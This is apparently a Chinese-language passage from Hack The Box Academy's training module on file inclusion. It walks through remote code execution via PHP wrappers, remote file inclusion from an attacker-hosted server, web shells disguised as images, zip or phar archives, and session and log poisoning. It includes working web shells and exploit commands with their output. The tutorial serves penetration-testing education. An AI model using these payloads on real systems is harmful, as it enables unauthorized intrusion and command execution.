因此，我们的第一步是对基本的 PHP Web shell 进行 base64 编码，如下所示：

  Remote Code Execution

```shell-session
tr01ax@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' | base64

PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
```

现在，我们可以对 base64 字符串进行 URL 编码，然后使用 `data://text/plain;base64,` 将其传递给 data 包装器。最后，我们可以使用 `&cmd=<COMMAND>` 向 Web shell 传递命令：



![](https://academy.hackthebox.com/storage/modules/23/data_wrapper_id.png)

我们也可以使用 cURL 进行相同的攻击，如下所示：

  Remote Code Execution

```shell-session
tr01ax@htb[/htb]$ curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
            uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Input

与 `data` 包装器类似，[input](https://www.php.net/manual/en/wrappers.php.php) 包装器可用于包含外部输入并执行 PHP 代码。它与 `data` 包装器的区别在于，我们将输入作为 POST 请求的数据传递给 `input` 包装器。因此，易受攻击的参数必须接受 POST 请求才能使此攻击生效。最后，`input` 包装器也依赖于 `allow_url_include` 设置，如前所述。

要使用 `input` 包装器重复我们之前的攻击，我们可以向易受攻击的 URL 发送 POST 请求，并将我们的 Web shell 添加为 POST 数据。要执行命令，我们会将其作为 GET 参数传递，就像我们在之前的攻击中所做的那样：

  Remote Code Execution

```shell-session
tr01ax@htb[/htb]$ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
            uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**注意：** 要将命令作为 GET 请求传递，我们需要易受攻击的函数也接受 GET 请求（即使用 `$_REQUEST`）。如果它只接受 POST 请求，那么我们可以将命令直接放在 PHP 代码中，而不是动态 Web shell（例如 `<\?php system('id')?>`）

---

## Expect

最后，我们可以利用 [expect](https://www.php.net/manual/en/wrappers.expect.php) 包装器，它允许我们直接通过 URL 流运行命令。Expect 的工作方式与我们之前使用的 Web shell 非常相似，但不需要提供 Web shell，因为它设计用于执行命令。

但是，expect 是一个外部包装器，因此需要在后端服务器上手动安装和启用，尽管一些 Web 应用程序的核心功能依赖于它，所以我们可能会在特定情况下发现它。我们可以像之前检查 `allow_url_include` 一样确定它是否安装在后端服务器上，但我们会 `grep` `expect`，如果它已安装并启用，我们会得到以下结果：

  Remote Code Execution

```shell-session
tr01ax@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
extension=expect
```

如我们所见，`extension` 配置关键字用于启用 `expect` 模块，这意味着我们应该能够使用它通过 LFI 漏洞获得 RCE（远程代码执行）。要使用 expect 模块，我们可以使用 `expect://` 包装器，然后传递我们要执行的命令，如下所示：

  Remote Code Execution

```shell-session
tr01ax@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

如我们所见，通过 `expect` 模块执行命令相当简单，因为这个模块就是为命令执行而设计的，如前所述。[Web Attacks](https://academy.hackthebox.com/module/details/134) 模块还介绍了将 `expect` 模块与 XXE 漏洞一起使用，因此如果您对如何在这里使用它有很好的理解，那么您应该已经准备好将其用于 XXE。

这是直接通过 LFI 漏洞执行系统命令的三种最常见的 PHP 包装器。我们还将在接下来的章节中介绍 `phar` 和 `zip` 包装器，我们可以将它们与允许文件上传的 Web 应用程序一起使用，通过 LFI 漏洞获得远程执行。#rfi #hacking #shell
[source](https://academy.hackthebox.com/module/23/section/254)

# Remote File Inclusion (RFI)（远程文件包含）

到目前为止，在本模块中，我们主要关注 `Local File Inclusion (LFI)`（本地文件包含）。但是，在某些情况下，如果易受攻击的函数允许包含远程 URL，我们也可能能够包含远程文件"[Remote File Inclusion (RFI)](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/11.2-Testing_for_Remote_File_Inclusion)"（远程文件包含）。这带来两个主要好处：

1. 枚举仅限本地的端口和 Web 应用程序（即 SSRF）
2. 通过包含我们托管的恶意脚本来获得远程代码执行

在本节中，我们将介绍如何通过 RFI 漏洞获得远程代码执行。[Server-side Attacks](https://academy.hackthebox.com/module/details/145) 模块涵盖了各种 `SSRF`（服务器端请求伪造）技术，这些技术也可与 RFI 漏洞一起使用。

## Local vs. Remote File Inclusion（本地与远程文件包含）

当易受攻击的函数允许我们包含远程文件时，我们可能能够托管恶意脚本，然后将其包含在易受攻击的页面中以执行恶意功能并获得远程代码执行。如果我们参考第一节中的表格，我们会看到以下是一些（如果存在漏洞）允许 RFI 的函数：

|**Function**|**Read Content**|**Execute**|**Remote URL**|
|---|:-:|:-:|:-:|
|**PHP**||||
|`include()`/`include_once()`|✅|✅|✅|
|`file_get_contents()`|✅|❌|✅|
|**Java**||||
|`import`|✅|✅|✅|
|**.NET**||||
|`@Html.RemotePartial()`|✅|❌|✅|
|`include`|✅|✅|✅|

如我们所见，几乎任何 RFI 漏洞也是 LFI 漏洞，因为任何允许包含远程 URL 的函数通常也允许包含本地 URL。但是，LFI 不一定是 RFI。这主要有三个原因：

1. 易受攻击的函数可能不允许包含远程 URL
2. 您可能只能控制文件名的一部分，而不是整个协议包装器（例如：`http://`、`ftp://`、`https://`）
3. 配置可能完全阻止 RFI，因为大多数现代 Web 服务器默认禁用包含远程文件

此外，正如我们在上表中所注意到的，某些函数确实允许包含远程 URL，但不允许代码执行。在这种情况下，我们仍然可以利用该漏洞通过 SSRF 枚举本地端口和 Web 应用程序。

## Verify RFI（验证 RFI）

在大多数语言中，包含远程 URL 被认为是危险的做法，因为它可能导致此类漏洞。这就是为什么远程 URL 包含通常默认禁用的原因。例如，PHP 中的任何远程 URL 包含都需要启用 `allow_url_include` 设置。我们可以像上一节那样通过 LFI 检查此设置是否已启用：

```shell-session
tr01ax@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include

allow_url_include = On
```

但是，这可能并不总是可靠的，因为即使启用了此设置，易受攻击的函数可能一开始就不允许包含远程 URL。因此，确定 LFI 漏洞是否也容易受到 RFI 攻击的更可靠方法是`尝试包含一个 URL`，看看我们是否能获取其内容。首先，`我们应该始终从尝试包含本地 URL 开始`，以确保我们的尝试不会被防火墙或其他安全措施阻止。因此，让我们使用 (`http://127.0.0.1:80/index.php`) 作为输入字符串，看看它是否被包含：



![](https://academy.hackthebox.com/storage/modules/23/lfi_local_url_include.jpg)

如我们所见，`index.php` 页面被包含在易受攻击的部分（即 History Description）中，因此该页面确实容易受到 RFI 攻击，因为我们能够包含 URL。此外，`index.php` 页面没有作为源代码文本包含，而是作为 PHP 执行和呈现的，因此易受攻击的函数也允许 PHP 执行，如果我们包含托管在我们机器上的恶意 PHP 脚本，这可能允许我们执行代码。

我们还看到我们能够指定端口 `80` 并获取该端口上的 Web 应用程序。如果后端服务器托管了任何其他本地 Web 应用程序（例如端口 `8080`），那么我们可能能够通过在其上应用 SSRF 技术来通过 RFI 漏洞访问它们。

**注意：** 包含易受攻击的页面本身（即 index.php）可能不太理想，因为这可能导致递归包含循环并导致后端服务器 DoS（拒绝服务）。

## Remote Code Execution with RFI（通过 RFI 获得远程代码执行）

获得远程代码执行的第一步是用 Web 应用程序的语言创建恶意脚本，在本例中是 PHP。我们可以使用从互联网下载的自定义 Web shell，使用反向 shell 脚本，或者像上一节中那样编写我们自己的基本 Web shell，这就是我们在本案例中要做的：

```shell-session
tr01ax@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
```

现在，我们需要做的就是托管这个脚本并通过 RFI 漏洞包含它。监听常见的 HTTP 端口如 `80` 或 `443` 是个好主意，因为如果易受攻击的 Web 应用程序有防火墙阻止出站连接，这些端口可能会被列入白名单。此外，我们也可以通过 FTP 服务或 SMB 服务托管脚本，接下来我们会看到。

## HTTP

现在，我们可以使用以下命令在我们的机器上启动一个基本的 Python 服务器：

```shell-session
tr01ax@htb[/htb]$ sudo python3 -m http.server <LISTENING_PORT>
Serving HTTP on 0.0.0.0 port <LISTENING_PORT> (http://0.0.0.0:<LISTENING_PORT>/) ...
```

现在，我们可以像之前那样通过 RFI 包含我们的本地 shell，但使用 `<OUR_IP>` 和我们的 `<LISTENING_PORT>`。我们还将使用 `&cmd=id` 指定要执行的命令：



![](https://academy.hackthebox.com/storage/modules/23/rfi_localhost.jpg)

如我们所见，我们确实在 Python 服务器上获得了连接，远程 shell 被包含，我们执行了指定的命令：

```shell-session
tr01ax@htb[/htb]$ sudo python3 -m http.server <LISTENING_PORT>
Serving HTTP on 0.0.0.0 port <LISTENING_PORT> (http://0.0.0.0:<LISTENING_PORT>/) ...

SERVER_IP - - [SNIP] "GET /shell.php HTTP/1.0" 200 -
```

**提示：** 我们可以检查我们机器上的连接以确保请求按我们指定的方式发送。例如，如果我们看到请求中附加了额外的扩展名（.php），那么我们可以从 payload 中省略它

## FTP

如前所述，我们也可以通过 FTP 协议托管我们的脚本。我们可以使用 Python 的 `pyftpdlib` 启动一个基本的 FTP 服务器，如下所示：

```shell-session
tr01ax@htb[/htb]$ sudo python -m pyftpdlib -p 21

[SNIP] >>> starting FTP server on 0.0.0.0:21, pid=23686 <<<
[SNIP] concurrency model: async
[SNIP] masquerade (NAT) address: None
[SNIP] passive ports: None
```

如果 http 端口被防火墙阻止或 `http://` 字符串被 WAF（Web 应用程序防火墙）阻止，这也可能很有用。要包含我们的脚本，我们可以重复之前的操作，但在 URL 中使用 `ftp://` 方案，如下所示：



![](https://academy.hackthebox.com/storage/modules/23/rfi_localhost.jpg)

如我们所见，这与我们的 http 攻击非常相似，命令被执行了。默认情况下，PHP 尝试以匿名用户身份进行身份验证。如果服务器需要有效的身份验证，则可以在 URL 中指定凭据，如下所示：

```shell-session
tr01ax@htb[/htb]$ curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@localhost/shell.php&cmd=id'
...SNIP...
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

## SMB

如果易受攻击的 Web 应用程序托管在 Windows 服务器上（我们可以从 HTTP 响应头中的服务器版本判断），那么我们不需要启用 `allow_url_include` 设置来进行 RFI 利用，因为我们可以利用 SMB 协议进行远程文件包含。这是因为 Windows 将远程 SMB 服务器上的文件视为普通文件，可以直接使用 UNC（通用命名约定）路径引用。

我们可以使用 `Impacket 的 smbserver.py` 启动一个 SMB 服务器，它默认允许匿名身份验证，如下所示：

```shell-session
tr01ax@htb[/htb]$ impacket-smbserver -smb2support share $(pwd)
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

现在，我们可以使用 UNC 路径（例如 `\\<OUR_IP>\share\shell.php`）包含我们的脚本，并像之前那样使用 (`&cmd=whoami`) 指定命令：



![](https://academy.hackthebox.com/storage/modules/23/windows_rfi.png)

如我们所见，这种攻击方式可以包含我们的远程脚本，而且我们不需要启用任何非默认设置。但是，我们必须注意，如果`我们与目标在同一网络中`，这种技术更有可能奏效，因为根据 Windows 服务器配置，通过互联网访问远程 SMB 服务器可能默认被禁用。#lfi #shell #hacking #uploads [source](https://academy.hackthebox.com/module/23/section/1493)
# LFI and File Uploads（LFI 与文件上传）

文件上传功能在大多数现代 Web 应用程序中无处不在，因为用户通常需要通过上传数据来配置其配置文件和 Web 应用程序的使用。对于攻击者来说，在后端服务器上存储文件的能力可以扩展许多漏洞的利用，例如文件包含漏洞。

[File Upload Attacks](https://academy.hackthebox.com/module/details/136) 模块涵盖了如何利用文件上传表单和功能的不同技术。但是，对于我们将在本节中讨论的攻击，我们不需要文件上传表单存在漏洞，只需要允许我们上传文件即可。如果易受攻击的函数具有代码`执行`功能，那么如果我们包含它，我们上传的文件中的代码将被执行，无论文件扩展名或文件类型如何。例如，我们可以上传一个图像文件（例如 `image.jpg`），并在其中存储 PHP Web shell 代码"而不是图像数据"，如果我们通过 LFI 漏洞包含它，PHP 代码将被执行，我们将获得远程代码执行。

如第一节所述，以下是允许通过文件包含执行代码的函数，其中任何一个都可以用于本节的攻击：

|**Function**|**Read Content**|**Execute**|**Remote URL**|
|---|:-:|:-:|:-:|
|**PHP**||||
|`include()`/`include_once()`|✅|✅|✅|
|`require()`/`require_once()`|✅|✅|❌|
|**NodeJS**||||
|`res.render()`|✅|✅|❌|
|**Java**||||
|`import`|✅|✅|✅|
|**.NET**||||
|`include`|✅|✅|✅|

---

## Image upload（图像上传）

图像上传在大多数现代 Web 应用程序中非常常见，因为如果上传功能编码安全，上传图像被广泛认为是安全的。但是，如前所述，这种情况下的漏洞不在文件上传表单中，而在文件包含功能中。

#### Crafting Malicious Image（制作恶意图像）

我们的第一步是创建一个包含 PHP Web shell 代码的恶意图像，该图像看起来仍然像图像并能正常工作。因此，我们将在文件名中使用允许的图像扩展名（例如 `shell.gif`），并且还应该在文件内容的开头包含图像魔术字节（例如 `GIF8`），以防上传表单同时检查扩展名和内容类型。我们可以按如下方式执行此操作：

  Crafting Malicious Image

```shell-session
tr01ax@htb[/htb]$ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

这个文件本身是完全无害的，不会对正常的 Web 应用程序产生丝毫影响。但是，如果我们将其与 LFI 漏洞结合使用，那么我们可能能够实现远程代码执行。

**注意：** 在这种情况下我们使用 `GIF` 图像，因为其魔术字节很容易输入，因为它们是 ASCII 字符，而其他扩展名的魔术字节是二进制的，我们需要对其进行 URL 编码。但是，这种攻击适用于任何允许的图像或文件类型。[File Upload Attacks](https://academy.hackthebox.com/module/details/136) 模块更深入地介绍了文件类型攻击，相同的逻辑可以应用于此处。

现在，我们需要上传我们的恶意图像文件。为此，我们可以转到 `Profile Settings` 页面并单击头像图像来选择我们的图像，然后单击上传，我们的图像应该成功上传：



![](https://academy.hackthebox.com/storage/modules/23/lfi_upload_gif.jpg)

#### Uploaded File Path（上传文件路径）

上传文件后，我们需要做的就是通过 LFI 漏洞包含它。要包含上传的文件，我们需要知道上传文件的路径。在大多数情况下，特别是对于图像，我们可以访问我们上传的文件并从其 URL 获取其路径。在我们的案例中，如果我们在上传图像后检查源代码，我们可以获取其 URL：

Code: html
```html
<img src="/profile_images/shell.gif" class="profile-image" id="profile-image">
```

**注意：** 如你所见，我们可以使用 `/profile_images/shell.gif` 作为文件路径。如果我们不知道文件上传到了哪里，可以对上传目录进行模糊测试（fuzzing），然后对我们上传的文件进行模糊测试，不过这种方法并不总是有效，因为某些 Web 应用程序会正确地隐藏上传的文件。

有了上传文件的路径，我们只需要将上传的文件包含到存在 LFI 漏洞的函数中，PHP 代码就会被执行，如下所示：



![](https://academy.hackthebox.com/storage/modules/23/lfi_include_uploaded_gif.jpg)

如你所见，我们包含了我们的文件并成功执行了 `id` 命令。

**注意：** 为了包含我们上传的文件，我们使用了 `./profile_images/`，因为在这种情况下，LFI 漏洞不会在我们的输入前添加任何目录前缀。如果它确实在我们的输入前添加了目录前缀，那么我们只需要使用 `../` 跳出该目录，然后使用我们的 URL 路径，正如我们在前面章节中学到的那样。

---

## Zip 上传

如前所述，上述技术非常可靠，在大多数情况下和大多数 Web 框架中都应该有效，只要存在漏洞的函数允许代码执行。还有一些其他仅适用于 PHP 的技术，它们利用 PHP 包装器（wrapper）来实现相同的目标。在上述技术不起作用的某些特定情况下，这些技术可能会派上用场。

我们可以利用 [zip](https://www.php.net/manual/en/wrappers.compression.php) 包装器来执行 PHP 代码。但是，这个包装器默认是不启用的，所以这种方法可能并不总是有效。为此，我们可以先创建一个 PHP webshell 脚本，并将其压缩成一个 zip 归档文件（命名为 `shell.jpg`），如下所示：

  上传文件路径

```shell-session
tr01ax@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
```

**注意：** 即使我们将 zip 归档命名为 (shell.jpg)，某些上传表单仍可能通过内容类型（content-type）检测将我们的文件识别为 zip 归档并禁止上传，因此如果允许上传 zip 归档，这种攻击成功的可能性会更高。

一旦我们上传了 `shell.jpg` 归档文件，我们就可以使用 `zip` 包装器将其包含为 (`zip://shell.jpg`)，然后使用 `#shell.php`（URL 编码）引用其中的任何文件。最后，我们可以像往常一样使用 `&cmd=id` 执行命令，如下所示：



![](https://academy.hackthebox.com/storage/modules/23/data_wrapper_id.png)

如你所见，这种方法也可以通过压缩的 PHP 脚本执行命令。

**注意：** 我们在文件名前添加了上传目录 (`./profile_images/`)，因为存在漏洞的页面 (`index.php`) 在主目录中。

---

## Phar 上传

最后，我们可以使用 `phar://` 包装器来实现类似的结果。为此，我们首先将以下 PHP 脚本写入 `shell.php` 文件：

Code: php

```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```

这个脚本可以被编译成一个 `phar`（PHP Archive，PHP 归档）文件，当被调用时会将一个 webshell 写入 `shell.txt` 子文件，我们可以与之交互。我们可以将其编译为 `phar` 文件并重命名为 `shell.jpg`，如下所示：

  上传文件路径

```shell-session
tr01ax@htb[/htb]$ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

现在，我们应该有一个名为 `shell.jpg` 的 phar 文件。一旦我们将它上传到 Web 应用程序，我们可以简单地使用 `phar://` 调用它并提供其 URL 路径，然后使用 `/shell.txt`（URL 编码）指定 phar 子文件，以获取我们用 (`&cmd=id`) 指定的命令的输出，如下所示：



![](https://academy.hackthebox.com/storage/modules/23/rfi_localhost.jpg)

如你所见，`id` 命令已成功执行。`zip` 和 `phar` 包装器方法应该被视为备选方法，以防第一种方法不起作用，因为我们讨论的第一种方法在这三种方法中是最可靠的。

**注意：** 还有另一种值得注意的（已过时的）LFI/上传攻击，当 PHP 配置中启用了文件上传且 `phpinfo()` 页面以某种方式暴露给我们时会发生。但是，这种攻击并不常见，因为它有非常具体的工作条件要求（LFI + 启用上传 + 旧版 PHP + 暴露的 phpinfo()）。如果你有兴趣了解更多，可以参考 [此链接](https://insomniasec.com/cdn-assets/LFI_With_PHPInfo_Assistance.pdf)。#shell #logpoisoning #hacking  [source](https://academy.hackthebox.com/module/23/section/252)

# 日志投毒（Log Poisoning）

我们在前面章节中看到，如果我们包含任何包含 PHP 代码的文件，只要存在漏洞的函数具有 `Execute`（执行）权限，代码就会被执行。我们将在本节讨论的攻击都依赖于相同的概念：将 PHP 代码写入我们控制的字段中，该字段会被记录到日志文件中（即 `投毒`/`污染` 日志文件），然后包含该日志文件以执行 PHP 代码。为了使这种攻击生效，PHP Web 应用程序应该对记录的文件具有读取权限，这在不同服务器之间有所不同。

与上一节的情况一样，任何具有 `Execute` 权限的以下函数都应该容易受到这些攻击：

|**函数**|**读取内容**|**执行**|**远程 URL**|
|---|:-:|:-:|:-:|
|**PHP**||||
|`include()`/`include_once()`|✅|✅|✅|
|`require()`/`require_once()`|✅|✅|❌|
|**NodeJS**||||
|`res.render()`|✅|✅|❌|
|**Java**||||
|`import`|✅|✅|✅|
|**.NET**||||
|`include`|✅|✅|✅|

---

## #PHP 会话投毒（Session Poisoning）

大多数 PHP Web 应用程序使用 `PHPSESSID` cookie，它可以在后端保存特定的用户相关数据，以便 Web 应用程序可以通过其 cookie 跟踪用户详细信息。这些详细信息存储在后端的 `session`（会话）文件中，在 Linux 上保存在 `/var/lib/php/sessions/`，在 Windows 上保存在 `C:\Windows\Temp\`。包含我们用户数据的文件名与我们的 `PHPSESSID` cookie 名称匹配，并带有 `sess_` 前缀。例如，如果 `PHPSESSID` cookie 设置为 `el4ukv0kqbvoirg7nkp4dncpk3`，那么它在磁盘上的位置将是 `/var/lib/php/sessions/sess_el4ukv0kqbvoirg7nkp4dncpk3`。

在 PHP 会话投毒攻击中，我们需要做的第一件事是检查我们的 PHPSESSID 会话文件，看看它是否包含我们可以控制和投毒的任何数据。所以，让我们首先检查是否为我们的会话设置了 `PHPSESSID` cookie：![image](https://academy.hackthebox.com/storage/modules/23/rfi_cookies_storage.png)

如你所见，我们的 `PHPSESSID` cookie 值是 `nhhv8i0o6ua4g88bkdl9u1fdsd`，所以它应该存储在 `/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd`。让我们尝试通过 LFI 漏洞包含这个会话文件并查看其内容：



![](https://academy.hackthebox.com/storage/modules/23/rfi_session_include.png)

**注意：** 你可能很容易猜到，cookie 值在不同会话之间会有所不同，所以你需要使用你自己会话中找到的 cookie 值来执行相同的攻击。

我们可以看到会话文件包含两个值：`page`，显示选择的语言页面，以及 `preference`，显示选择的语言。`preference` 值不在我们的控制之下，因为我们没有在任何地方指定它，它必须是自动指定的。然而，`page` 值在我们的控制之下，因为我们可以通过 `?language=` 参数控制它。

让我们尝试将 `page` 的值设置为自定义值（例如 `language parameter`）并查看它是否在会话文件中发生变化。我们可以通过简单地访问指定了 `?language=session_poisoning` 的页面来做到这一点，如下所示：

Code: url

```url
http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
```

现在，让我们再次包含会话文件以查看内容：



![](https://academy.hackthebox.com/storage/modules/23/lfi_poisoned_sessid.png)

这次，会话文件包含 `session_poisoning` 而不是 `es.php`，这确认了我们能够控制会话文件中 `page` 的值。我们的下一步是通过将 PHP 代码写入会话文件来执行 `投毒` 步骤。我们可以通过将 `?language=` 参数更改为 URL 编码的 webshell 来编写一个基本的 PHP webshell，如下所示：

Code: url

```url
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

最后，我们可以包含会话文件并使用 `&cmd=id` 来执行命令：



![](https://academy.hackthebox.com/storage/modules/23/rfi_session_id.png)

注意：要执行另一个命令，会话文件必须再次用 webshell 投毒，因为在我们上次包含后它会被 `/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd` 覆盖。理想情况下，我们会使用被投毒的 webshell 将一个持久的 webshell 写入 Web 目录，或者发送一个反向 shell 以便于交互。

---

## 服务器日志投毒

`Apache` 和 `Nginx` 都维护各种日志文件，例如 `access.log` 和 `error.log`。`access.log` 文件包含对服务器发出的所有请求的各种信息，包括每个请求的 `User-Agent` 头。由于我们可以在请求中控制 `User-Agent` 头，我们可以像上面那样用它来投毒服务器日志。

一旦被投毒，我们需要通过 LFI 漏洞包含日志，为此我们需要对日志具有读取访问权限。`Nginx` 日志默认可被低权限用户（例如 `www-data`）读取，而 `Apache` 日志只能被高权限用户（例如 `root`/`adm` 组）读取。然而，在较旧或配置不当的 `Apache` 服务器中，这些日志可能可被低权限用户读取。

默认情况下，`Apache` 日志在 Linux 上位于 `/var/log/apache2/`，在 Windows 上位于 `C:\xampp\apache\logs\`，而 `Nginx` 日志在 Linux 上位于 `/var/log/nginx/`，在 Windows 上位于 `C:\nginx\log\`。但是，在某些情况下日志可能在不同的位置，所以我们可能需要使用 [LFI Wordlist](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) 来模糊测试它们的位置，这将在下一节讨论。

所以，让我们尝试从 `/var/log/apache2/access.log` 包含 Apache 访问日志，看看我们得到什么：



![](https://academy.hackthebox.com/storage/modules/23/rfi_access_log.png)

如你所见，我们可以读取日志。日志包含 `远程 IP 地址`、`请求页面`、`响应代码` 和 `User-Agent` 头。如前所述，`User-Agent` 头是通过 HTTP 请求头由我们控制的，所以我们应该能够投毒这个值。

**提示：** 日志往往很大，在 LFI 漏洞中加载它们可能需要一段时间，或者在最坏的情况下甚至会导致服务器崩溃。所以，在生产环境中要小心高效地使用它们，不要发送不必要的请求。

为此，我们将使用 `Burp Suite` 拦截我们之前的 LFI 请求并将 `User-Agent` 头修改为 `Apache Log Poisoning`：![image](https://academy.hackthebox.com/storage/modules/23/rfi_repeater_ua.png)

**注意：** 由于对服务器的所有请求都会被记录，我们可以投毒对 Web 应用程序的任何请求，而不一定是像我们上面那样的 LFI 请求。

正如预期的那样，我们的自定义 User-Agent 值在包含的日志文件中可见。现在，我们可以通过将其设置为基本的 PHP webshell 来投毒 `User-Agent` 头：![image](https://academy.hackthebox.com/storage/modules/23/rfi_cmd_repeater.png)

我们也可以通过 cURL 发送请求来投毒日志，如下所示：

```shell-session
tr01ax@htb[/htb]$ curl -s "http://<SERVER_IP>:<PORT>/index.php" -A "<?php system($_GET['cmd']); ?>"
```

由于日志现在应该包含 PHP 代码，LFI 漏洞应该执行此代码，我们应该能够获得远程代码执行。我们可以指定要用 (`?cmd=id`) 执行的命令：![image](https://academy.hackthebox.com/storage/modules/23/rfi_id_repeater.png)

我们看到我们成功执行了命令。完全相同的攻击也可以在 `Nginx` 日志上执行。

**提示：** `User-Agent` 头也会显示在 Linux `/proc/` 目录下的进程文件中。所以，我们可以尝试包含 `/proc/self/environ` 或 `/proc/self/fd/N` 文件（其中 N 是一个 PID，通常在 0-50 之间），我们可能能够对这些文件执行相同的攻击。如果我们无法读取服务器日志，这可能会很有用，但是这些文件可能也只有特权用户才能读取。

最后，还有其他类似的日志投毒技术，我们可以根据我们对哪些日志有读取访问权限在各种系统日志上使用。以下是我们可能能够读取的一些服务日志：

- `/var/log/sshd.log`
- `/var/log/mail`
- `/var/log/vsftpd.log`

我们应该首先尝试通过 LFI 读取这些日志，如果我们确实有访问权限，我们可以尝试像上面那样投毒它们。例如，如果 `ssh` 或 `ftp` 服务对我们开放，并且我们可以通过 LFI 读取它们的日志，那么我们可以尝试登录它们并将用户名设置为 PHP 代码，在包含它们的日志时，PHP 代码就会执行。`mail` 服务也是如此，因为我们可以发送包含 PHP 代码的电子邮件，在包含其日志时，PHP 代码就会执行。我们可以将这种技术推广到任何记录我们控制的参数并且我们可以通过 LFI 漏洞读取的日志。#lfi #scanning  #hacking #fuzzing [source](https://academy.hackthebox.com/module/23/section/1494)

# 自动化扫描

理解文件包含攻击的工作原理以及如何手动构造高级 payload 并使用自定义技术来实现远程代码执行是至关重要的。这是因为在许多情况下，为了利用漏洞，可能需要一个与其特定配置相匹配的自定义 payload。此外，当处理 WAF（Web Application Firewall，Web 应用程序防火墙）或防火墙等安全措施时，我们必须运用我们的理解来查看特定的 payload/字符是如何被阻止的，并尝试构造自定义 payload 来绕过它。

在许多简单的情况下，我们可能不需要手动利用 LFI 漏洞。有许多自动化方法可以帮助我们快速识别和利用简单的 LFI 漏洞。我们可以利用模糊测试工具测试大量常见的 LFI payload 列表，看看是否有任何有效的，或者我们可以使用专门的 LFI 工具来测试此类漏洞。这就是我们将在本节讨论的内容。

---

## 模糊测试参数

用户可以在 Web 应用程序前端使用的 HTML 表单通常经过适当的测试，并且对各种 Web 攻击具有良好的安全性。然而，在许多情况下，页面可能有其他暴露的参数，这些参数没有链接到任何 HTML 表单，因此普通用户永远不会访问或无意中造成伤害。这就是为什么对暴露的参数进行模糊测试可能很重要，因为它们往往不如公开的参数那样安全。

[Attacking Web Applications with Ffuf](https://academy.hackthebox.com/module/details/54) 模块详细介绍了我们如何模糊测试 `GET`/`POST` 参数。例如，我们可以对页面进行常见 `GET` 参数的模糊测试，如下所示：

```shell-session
tr01ax@htb[/htb]$ ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287

...SNIP...

 :: Method           : GET
 :: URL              : http://<SERVER_IP>:<PORT>/index.php?FUZZ=value
 :: Wordlist         : FUZZ: /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response size: xxx
________________________________________________

language                    [Status: xxx, Size: xxx, Words: xxx, Lines: xxx]
```

一旦我们识别出一个没有链接到我们测试过的任何表单的暴露参数，我们就可以执行本模块中讨论的所有 LFI 测试。这不仅适用于 LFI 漏洞，也适用于其他模块中讨论的大多数 Web 漏洞，因为暴露的参数也可能容易受到任何其他漏洞的影响。

**提示：** 为了更精确的扫描，我们可以将扫描限制在此 [链接](https://book.hacktricks.xyz/pentesting-web/file-inclusion#top-25-parameters) 上找到的最常见的 LFI 参数。

---

## LFI 字典

到目前为止，在本模块中，我们一直在手动构造 LFI payload 来测试 LFI 漏洞。这是因为手动测试更可靠，可以发现其他方式可能无法识别的 LFI 漏洞，如前所述。然而，在许多情况下，我们可能想要对一个参数运行快速测试，看看它是否容易受到任何常见 LFI payload 的影响，这可能会在需要测试各种漏洞的 Web 应用程序中节省我们的时间。

有许多 [LFI Wordlists](https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI) 我们可以用于此扫描。一个好的字典是 [LFI-Jhaddix.txt](https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/LFI/LFI-Jhaddix.txt)，因为它包含各种绕过方法和常见文件，因此可以轻松一次运行多个测试。我们可以使用这个字典来模糊测试我们在整个模块中一直测试的 `?language=` 参数，如下所示：

```shell-session
tr01ax@htb[/htb]$ ffuf -w /opt/useful/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287

...SNIP...

 :: Method           : GET
 :: URL              : http://<SERVER_IP>:<PORT>/index.php?FUZZ=key
